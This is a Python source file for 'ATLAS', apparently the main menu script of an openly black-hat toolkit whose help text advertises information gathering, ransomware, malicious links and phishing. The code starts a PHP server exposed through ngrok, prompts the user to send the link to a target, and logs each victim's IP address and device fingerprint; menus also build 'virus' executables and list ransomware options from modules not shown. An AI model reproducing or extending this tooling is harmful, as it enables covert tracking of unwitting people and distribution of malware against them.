import os
import sys
from time import time
import time
from colorama import Fore,init
from InformationGatering import Traceroute,cloudflare,cms,dnslookup,finder,findsharedns,httpheader,iplocation,portscan,reverseip,robots,whois
from plyer import notification
from Virus import Restart,Shotdown,path
import json
from subprocess import Popen
from pyngrok import ngrok
import os
import platform
import getpass
#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
a=getpass.getuser()
def Clear():
    a=platform.uname()
    b=a[0]
    if b == "Linux":
        os.system("clear")
    elif b == "Windows":
        os.system("cls")
def Banner():

    os=platform.uname()[0]
    od=platform.uname()[1]
    op=platform.uname()[2]
    vs=platform.uname()[3]
    ot=platform.uname()[4]
    print(Fore.WHITE+"""
                      ''ATLAS''
       .,cdxxxoc,.               .:kKMMMNWMMMNk:.      """+Fore.BLUE+"""  System = """+Fore.WHITE+str(os)+"""
      cKMMN0OOOKWMMXo.;         ;0MWk:.      .:OMMk.   """+Fore.BLUE+"""  Version = """+Fore.WHITE+str(vs)+"""
    ;WMK;.       .lKMMNM,     :NMK,             .OMW;  """+Fore.BLUE+"""  Node = """+Fore.WHITE+str(od)+"""
   cMW;            'WMMMN   ,XMK,                 oMM' """+Fore.BLUE+"""  Release = """+Fore.WHITE+str(op)+"""
  .MMc               ..;l. xMN:                    KM0 """+Fore.BLUE+"""  Machine = """+Fore.WHITE+str(ot)+"""
  'MM.                   'NMO                      oMM """+Fore.BLUE+"""  User = """+Fore.WHITE+str(a)+"""
  .MM,                 .kMMl                       xMN   #---------------#
   KM0               .kMM0. .dl:,..               .WMd   # """+Fore.RED+"""  Developer:"""+Fore.WHITE+"""  #
   .XM0.           ,OMMK,     MMMK.              .XMK    # """+Fore.CYAN+""" OmidRanjbar"""+Fore.WHITE+"""  #
     oWMO:.    .;xNMMk,        NNMKl.          .xWMx     # """+Fore.RED+"""  ToolName:"""+Fore.WHITE+"""   #
       :ONMMNXMMMKx;             ,xNMWKkxllox0NMWk,      # """+Fore.CYAN+"""   'ATLAS'"""+Fore.WHITE+"""    #
           .....                    .:dOOXXKOxl,         #--=------------#
         """)
Clear()
Banner()

def liststatrt():
    print(Fore.WHITE+"                    W"+Fore.MAGENTA+"E"+Fore.CYAN+"L"+Fore.YELLOW+"C"+Fore.RED+"O"+Fore.BLUE+"M"+Fore.GREEN+"E"+Fore.WHITE+" T"+Fore.LIGHTGREEN_EX+"O "+Fore.LIGHTMAGENTA_EX+"A"+Fore.LIGHTCYAN_EX+"T"+Fore.LIGHTRED_EX+"L"+Fore.YELLOW+"A"+Fore.BLUE+"S"+Fore.WHITE+"\n")
    time.sleep(0.1)
    print(Fore.RED+"   /"+Fore.YELLOW+"01"+Fore.BLUE+"\   "+Fore.WHITE+" Start")
    time.sleep(0.1)
    print(Fore.GREEN+"   /"+Fore.WHITE+"02"+Fore.BLUE+"\   "+Fore.WHITE+" Help")
    time.sleep(0.1)
    print(Fore.GREEN+"   /"+Fore.YELLOW+"03"+Fore.LIGHTRED_EX+"\   "+Fore.WHITE+" Exit\n")
    time.sleep(0.1)

def listhelp():
    print(Fore.WHITE+"                    W"+Fore.MAGENTA+"E"+Fore.CYAN+"L"+Fore.YELLOW+"C"+Fore.RED+"O"+Fore.BLUE+"M"+Fore.WHITE+" T"+Fore.LIGHTGREEN_EX+"O "+Fore.LIGHTMAGENTA_EX+"A"+Fore.LIGHTCYAN_EX+"T"+Fore.LIGHTRED_EX+"L"+Fore.YELLOW+"A"+Fore.BLUE+"S"+Fore.WHITE+"\n")
    print(Fore.GREEN+"    Contact Us : "+Fore.WHITE+"@Deusnegro"+Fore.CYAN+"          Telegram : "+Fore.WHITE+"@Eblackhat")
    print(Fore.GREEN+"    Developer : "+Fore.WHITE+"OmidRanjbar(Zed)"+Fore.RED+"     Backup section : "+Fore.WHITE+"https://t.me/Deusnegro\n")
    print("""    Atlas is a versatile tool used to collect information,ransomwar,
    create malicious links and phishing.
    This tool is designed for black hat hackers """+Fore.RED+"""
    (the author is not responsible for how the tool is used)""")
    try:
        input(Fore.GREEN+"\n   /"+Fore.YELLOW+"M"+Fore.BLUE+"\   "+Fore.WHITE+"Back To Menu (Press Enter...) ")
    except:
        print("")
        sys.exit()


def listmeno():
    time.sleep(0.1)
    print(Fore.GREEN+"   /"+Fore.YELLOW+"01"+Fore.BLUE+"\   "+Fore.WHITE+"Information Gathering Web")
    time.sleep(0.1)
    print(Fore.GREEN+"   /"+Fore.MAGENTA+"02"+Fore.RED+"\   "+Fore.WHITE+"Build Malicious Link")
    time.sleep(0.1)
    print(Fore.WHITE+"   /"+Fore.WHITE+"03"+Fore.CYAN+"\   "+Fore.WHITE+"Virus")
    time.sleep(0.1)
    print(Fore.GREEN+"   /"+Fore.BLUE+":)"+Fore.LIGHTRED_EX+"\   "+Fore.WHITE+"Build Phishing Page (Next Version)")
    time.sleep(0.1)
    print(Fore.YELLOW+"   /"+Fore.GREEN+":)"+Fore.WHITE+"\   "+Fore.WHITE+"RansomWare (Next Version)\n")  
    time.sleep(0.1)

def listig():
    print("   Pleaes Weit Loading...\n")
    time.sleep(1)
    print(Fore.GREEN+"   /"+Fore.YELLOW+"01"+Fore.BLUE+"\   "+Fore.WHITE+"IP Location")
    time.sleep(0.1)
    print(Fore.BLUE+"   /"+Fore.RED+"02"+Fore.LIGHTWHITE_EX+"\   "+Fore.WHITE+"Bypass Cloud Flare")
    time.sleep(0.1)
    print(Fore.GREEN+"   /"+Fore.BLUE+"03"+Fore.CYAN+"\   "+Fore.WHITE+"Cms Detect")
    time.sleep(0.1)
    print(Fore.RED+"   /"+Fore.YELLOW+"04"+Fore.BLUE+"\   "+Fore.WHITE+"Trace Toute")
    time.sleep(0.1)
    print(Fore.YELLOW+"   /"+Fore.MAGENTA+"05"+Fore.GREEN+"\   "+Fore.WHITE+"Port Scan")
    time.sleep(0.1)
    print(Fore.BLUE+"   /"+Fore.GREEN+"06"+Fore.MAGENTA+"\   "+Fore.WHITE+"Reverse IP")
    time.sleep(0.1)
    print(Fore.LIGHTGREEN_EX+"   /"+Fore.YELLOW+"07"+Fore.LIGHTCYAN_EX+"\   "+Fore.WHITE+"Whois site")
    time.sleep(0.1)
    print(Fore.GREEN+"   /"+Fore.RED+"08"+Fore.BLUE+"\   "+Fore.WHITE+"Find Shared DNS")
    time.sleep(0.1)
    print(Fore.GREEN+"   /"+Fore.YELLOW+"09"+Fore.LIGHTRED_EX+"\   "+Fore.WHITE+"Show HTTP Header")
    time.sleep(0.1)
    print(Fore.LIGHTYELLOW_EX+"   /"+Fore.GREEN+"10"+Fore.BLUE+"\   "+Fore.WHITE+"DNS Lookup")
    time.sleep(0.1)
    print(Fore.WHITE+"   /"+Fore.YELLOW+"11"+Fore.RED+"\   "+Fore.WHITE+"Robots Scanner")
    time.sleep(0.1)
    print(Fore.GREEN+"   /"+Fore.WHITE+"12"+Fore.BLUE+"\   "+Fore.WHITE+"Admin Page Finder\n")
    time.sleep(0.1)
def listphish():
    "Next Version"

def rsw():
    print("   Pleaes Weit Loading...\n")
    time.sleep(1)
    print(Fore.BLUE+"   /"+Fore.GREEN+"01"+Fore.MAGENTA+"\   "+Fore.WHITE+"Bilud Ransomware(Data Encryption) ")
    time.sleep(0.1)
    print(Fore.BLUE+"   /"+Fore.RED+"02"+Fore.LIGHTWHITE_EX+"\   "+Fore.WHITE+"Create exe Ransomware ")
    time.sleep(0.1)
    print(Fore.BLUE+"   /"+Fore.GREEN+":)"+Fore.MAGENTA+"\   "+Fore.WHITE+"Bilud Ransomware(Lock Screen Next Version) ")
    time.sleep(0.1)
def listLink():
    print(Fore.RED+"   /"+Fore.YELLOW+"01"+Fore.BLUE+"\   "+Fore.WHITE+"Information Gathering With Link")
    time.sleep(0.1)
    print(Fore.YELLOW+"   /"+Fore.MAGENTA+"02"+Fore.GREEN+"\   "+Fore.WHITE+"Play Sound+18")
    time.sleep(0.1)
    print(Fore.BLUE+"   /"+Fore.GREEN+"03"+Fore.MAGENTA+"\   "+Fore.WHITE+"Play Sound You Hacked")
    time.sleep(0.1)
    print(Fore.GREEN+"   /"+Fore.WHITE+":)"+Fore.BLUE+"\   "+Fore.WHITE+"Location Target (Next Version)")
    time.sleep(0.1)
def listvirus():
    print("   Pleaes Weit Loading...\n")
    time.sleep(1)
    print(Fore.WHITE+"   /"+Fore.GREEN+"01"+Fore.MAGENTA+"\   "+Fore.WHITE+"Bilud Virus Shotdown")
    time.sleep(0.1)
    print(Fore.YELLOW+"   /"+Fore.CYAN+"02"+Fore.RED+"\   "+Fore.WHITE+"Bilud Virus Restart")
    time.sleep(0.1)
    print(Fore.LIGHTYELLOW_EX+"   /"+Fore.LIGHTRED_EX+"03"+Fore.BLUE+"\   "+Fore.WHITE+"Bilud Virus exe ")
    time.sleep(0.1)
#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

def Bannerr():
 a=platform.uname()
 b=a[0]
 if b == "Linux":
    os.system("clear") 
 elif b == "Windows":
    os.system("cls")

 print(Fore.RED+"""
   __ __ __  _
  .`_//_//_/ / `.
            /  .`
           / .`
          /.`
         /`  ATLAS
       
       """)

stat_file = 0
def Data():
    def phpserver():
        with open("log","w") as phplog:
            Popen(("php","-S","localhost:4545","-t","Link/zed"),stderr=phplog,stdout=phplog)
    phpserver()
    u = ngrok.connect(4545,"http")
    Bannerr()
    print(Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"] "+Fore.WHITE+str(u))
    print(Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"] "+Fore.WHITE+"Send Link Target ;)")
    def data():
        global stat_file
        if not str(os.stat("Link/zed/info.json").st_size) == stat_file:
            stat_file = str(os.stat("Link/zed/info.json").st_size)
            fileip = open("Link/zed/info.json","r")
            b = fileip.read()
            try:
                infor = json.loads(b)
                for valus in infor['dev']:
                    # Banner()
                    # print(Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"] "+Fore.WHITE+str(u))
                    print(Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"] "+Fore.WHITE+"Os Name : "+Fore.BLUE+valus['Os-Name'])
                    print(Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"] "+Fore.WHITE+"Os Version : "+Fore.BLUE+valus['Os-Version'])
                    print(Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"] "+Fore.WHITE+"CPU Core : "+Fore.BLUE+valus['CPU-Core'])
                    print(Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"] "+Fore.WHITE+"Browser Name : "+Fore.BLUE+valus['Browser-Name'])
                    print(Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"] "+Fore.WHITE+"Browser Version : "+Fore.BLUE+valus['Browser-Version'])
                    print(Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"] "+Fore.WHITE+"CPU Architecture : "+Fore.BLUE+valus['CPU-Architecture'])
                    print(Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"] "+Fore.WHITE+"Resolution : "+Fore.BLUE+valus['Resolution'])
                    print(Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"] "+Fore.WHITE+"Time-Zone : "+Fore.BLUE+valus['Time-Zone'])
                    print(Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"] "+Fore.WHITE+"Language : "+Fore.BLUE+valus['Language'])
                    print("\n"+Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"] "+Fore.WHITE+"  Lisener ;) ")
                    a = open("Link/zed/info.json","w")
                    b = a.write("")
                    a.close()
            except:
                print("")
    def readip():
        global stat_file
        if not str(os.stat("Link/zed/ip.txt").st_size) == stat_file:
            stat_file = str(os.stat("Link/zed/ip.txt").st_size)
            fileip = open('Link/zed/ip.txt','r')
            i = fileip.readlines()
            try:
                i = i[-1]
                Bannerr()
                print(Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"] "+Fore.WHITE+str(u))
                print(Fore.RED+"\n ["+Fore.WHITE+"+"+Fore.RED+"] "+Fore.WHITE+"IP: "+Fore.RED+i+Fore.WHITE+" Opened link :"+Fore.RED+time.ctime())
                print("")
                o = open("Link/zed/ip.txt","w")
                o.write("")
                o.close()
            except:
                print("")

            
    while True:
        readip()
        data()
#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
def Bannerr():
 a=platform.uname()
 b=a[0]
 if b == "Linux":
    os.system("clear") 
 elif b == "Windows":
    os.system("cls")

 print(Fore.RED+"""
   __ __ __  _
  .`_//_//_/ / `.
            /  .`
           / .`
          /.`
         /`  ATLAS
       
       """)
stat_file = 0

def Sound():
    def phpserver():
        with open("log","w") as phplog:
            Popen(("php","-S","localhost:4545","-t","Link/sound+18"),stderr=phplog,stdout=phplog)
    phpserver()
    u = ngrok.connect(4545,"http")
    Bannerr()
    print(Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"] "+Fore.WHITE+str(u))
    print(Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"] "+Fore.WHITE+"Send Link Target ;)")
    def readip():
        global stat_file
        if not str(os.stat("Link/sound+18/ip.txt").st_size) == stat_file:
            stat_file = str(os.stat("Link/sound+18/ip.txt").st_size)
            fileip = open('Link/sound+18/ip.txt','r')
            i = fileip.readlines()
            try:
                i = i[-1]
                Bannerr()
                print(Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"] "+Fore.WHITE+str(u))
                print(Fore.RED+"\n ["+Fore.WHITE+"+"+Fore.RED+"] "+Fore.WHITE+"IP: "+Fore.RED+i+Fore.WHITE+" Opened link :"+Fore.RED+time.ctime())
                time.sleep(0.5)
                print(Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"] "+"played ;)")
                o = open("Link/sound+18/ip.txt","w")
                o.write("")
                o.close()
            except:
                print("")

            
    while True:
        readip()


#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
def Bannerr():
 a=platform.uname()
 b=a[0]
 if b == "Linux":
    os.system("clear") 
 elif b == "Windows":
    os.system("cls")

 print(Fore.RED+"""
   __ __ __  _
  .`_//_//_/ / `.
            /  .`
           / .`
          /.`
         /`  ATLAS
       
       """)
stat_file = 0
os.system("cls")
def SoundHacker():
    def phpserver():
        with open("log","w") as phplog:
            Popen(("php","-S","localhost:4545","-t","Link/zedzed"),stderr=phplog,stdout=phplog)
    phpserver()
    u = ngrok.connect(4545,"http")
    Bannerr()
    print(Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"] "+Fore.WHITE+str(u))
    print(Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"] "+Fore.WHITE+"Send Link Target ;)")
    def readip():
        global stat_file
        if not str(os.stat("Link/zedzed/ip.txt").st_size) == stat_file:
            stat_file = str(os.stat("Link/zedzed/ip.txt").st_size)
            fileip = open('Link/zedzed/ip.txt','r')
            i = fileip.readlines()
            try:
                i = i[-1]
                Bannerr()
                print(Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"] "+Fore.WHITE+str(u))
                print(Fore.RED+"\n ["+Fore.WHITE+"+"+Fore.RED+"] "+Fore.WHITE+"IP: "+Fore.RED+i+Fore.WHITE+" Opened link :"+Fore.RED+time.ctime())
                time.sleep(0.5)
                print(Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"] "+"played ;)")
                o = open("Link/zedzed/ip.txt","w")
                o.write("")
                o.close()
            except:
                pass

            
    while True:
        readip()


#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
def notfcation():
 notification.notify(
    title="ATLAS",
    message="""Hello, I am OmidRanjbar.
Welcom To Tools """,
    app_icon="icon/Hacker1.ico",
    timeout=12
)
notfcation()
#----------------------------
while True:
 try:
    Clear()
    Banner()
    liststatrt()
    start = input(Fore.RED+"   ┌──("+Fore.WHITE+"kali"+Fore.BLUE+"㉿"+Fore.WHITE+"kali"+Fore.RED+")"+Fore.WHITE+'-'+Fore.RED+"["+Fore.WHITE+"~/"+Fore.LIGHTMAGENTA_EX+"A"+Fore.LIGHTCYAN_EX+"T"+Fore.LIGHTRED_EX+"L"+Fore.YELLOW+"A"+Fore.BLUE+"S"+Fore.RED+"]"+"""
   └─$ """+Fore.WHITE)
    if start == "3":
        notification.notify(
        title="ATLAS",
        message="""Good By""",
        app_icon="icon/Hacker1.ico",
        timeout=12
        )
        sys.exit()
    elif start =="":
        try:
            input(Fore.GREEN+"\n   /"+Fore.YELLOW+"!"+Fore.BLUE+"\   "+Fore.WHITE+"Pleses Enter Date")
        except KeyboardInterrupt:
            sys.exit()
    elif start == "2":
        Clear()
        Banner()
        listhelp()
    elif start == "1":
        Clear()
        Banner()
        listmeno()
        Meno = input(Fore.RED+"   ┌──("+Fore.WHITE+"kali"+Fore.BLUE+"㉿"+Fore.WHITE+"kali"+Fore.RED+")"+Fore.WHITE+'-'+Fore.RED+"["+Fore.WHITE+"~/"+Fore.LIGHTMAGENTA_EX+"A"+Fore.LIGHTCYAN_EX+"T"+Fore.LIGHTRED_EX+"L"+Fore.YELLOW+"A"+Fore.BLUE+"S"+Fore.RED+"/"+Fore.WHITE+"M"+Fore.BLUE+"E"+Fore.GREEN+"N"+Fore.RED+"O"+Fore.RED+"]"+"""
   └─$ """+Fore.WHITE)
        if Meno == "1":
            Clear()
            Banner()
            listig()
            igm = input(Fore.RED+"   ┌──("+Fore.WHITE+"kali"+Fore.BLUE+"㉿"+Fore.WHITE+"kali"+Fore.RED+")"+Fore.WHITE+'-'+Fore.RED+"["+Fore.WHITE+"~/"+Fore.LIGHTMAGENTA_EX+"A"+Fore.LIGHTCYAN_EX+"T"+Fore.LIGHTRED_EX+"L"+Fore.YELLOW+"A"+Fore.BLUE+"S"+Fore.RED+"/"+Fore.WHITE+"M"+Fore.BLUE+"E"+Fore.GREEN+"N"+Fore.RED+"O"+Fore.YELLOW+"/"+Fore.LIGHTCYAN_EX+"I"+Fore.RED+"G"+Fore.RED+"]"+"""
   └─$ """+Fore.WHITE)
            if start =="":
                try:
                    input(Fore.GREEN+"\n   /"+Fore.YELLOW+"!"+Fore.BLUE+"\   "+Fore.WHITE+"Pleses Enter Date")
                except KeyboardInterrupt:
                    sys.exit()
            elif igm == "1":
                    Clear()
                    Banner()
                    iplocation.__start__()
            elif igm == "2":
                    Clear()
                    Banner()
                    cloudflare.__start__()
            elif igm == "3":
                    Clear()
                    Banner()
                    cms.__start__()
            elif igm == "4":
                    Clear()
                    Banner()
                    Traceroute.__start__()
            elif igm == "5":
                    Clear()
                    Banner()
                    portscan.__start__()
            elif igm == "6":
                    Clear()
                    Banner()
                    reverseip.__start__()
            elif igm == "7":
                    Clear()
                    Banner()
                    whois.__start__()
            elif igm == "8":
                    Clear()
                    Banner()
                    findsharedns.__start__()
            elif igm == "9":
                    Clear()
                    Banner()
                    httpheader.__start__()
            elif igm == "10":
                    Clear()
                    Banner()
                    dnslookup.__start__()
            elif igm == "11":
                   Clear()
                   Banner()
                   robots.__start__()
            elif igm == "12":
                   Clear()
                   Banner()
                   finder.__start__()
        elif Meno == "2":
            Clear()
            Banner()
            listLink()
            link = input(Fore.RED+"\n   ┌──("+Fore.WHITE+"kali"+Fore.BLUE+"㉿"+Fore.WHITE+"kali"+Fore.RED+")"+Fore.WHITE+'-'+Fore.RED+"["+Fore.WHITE+"~/"+Fore.LIGHTMAGENTA_EX+"A"+Fore.LIGHTCYAN_EX+"T"+Fore.LIGHTRED_EX+"L"+Fore.YELLOW+"A"+Fore.BLUE+"S"+Fore.RED+"/"+Fore.WHITE+"M"+Fore.BLUE+"E"+Fore.GREEN+"N"+Fore.RED+"O"+Fore.YELLOW+"/"+Fore.LIGHTCYAN_EX+"L"+Fore.RED+"M"+Fore.RED+"]"+"""
   └─$ """+Fore.WHITE)
            if link == "":
                try:
                    input(Fore.GREEN+"\n   /"+Fore.YELLOW+"!"+Fore.BLUE+"\   "+Fore.WHITE+"Pleses Enter Date")
                except KeyboardInterrupt:
                    sys.exit()
            elif link == "1":
                Data()
            elif link == "2":
                Sound()
            elif link == "3":
                SoundHacker()
                
        elif Meno == "3":
            Clear()
            Banner()
            listvirus()
            phl = input(Fore.RED+"\n   ┌──("+Fore.WHITE+"kali"+Fore.BLUE+"㉿"+Fore.WHITE+"kali"+Fore.RED+")"+Fore.WHITE+'-'+Fore.RED+"["+Fore.WHITE+"~/"+Fore.LIGHTMAGENTA_EX+"A"+Fore.LIGHTCYAN_EX+"T"+Fore.LIGHTRED_EX+"L"+Fore.YELLOW+"A"+Fore.BLUE+"S"+Fore.RED+"/"+Fore.WHITE+"M"+Fore.BLUE+"E"+Fore.GREEN+"N"+Fore.RED+"O"+Fore.YELLOW+"/"+Fore.LIGHTCYAN_EX+"V"+Fore.RED+"S"+Fore.RED+"]"+"""
   └─$ """+Fore.WHITE)
            if phl == "1":
                Shotdown.Shotdown()
            elif phl == "2":
                Restart.restart()
            elif phl == "3":
                path.buldexe()
            elif phl == "":
                try:
                    input(Fore.GREEN+"\n   /"+Fore.YELLOW+"!"+Fore.BLUE+"\   "+Fore.WHITE+"Pleses Enter Date")
                except KeyboardInterrupt:
                    sys.exit()

 except KeyboardInterrupt:
     print("")
     sys.exit()

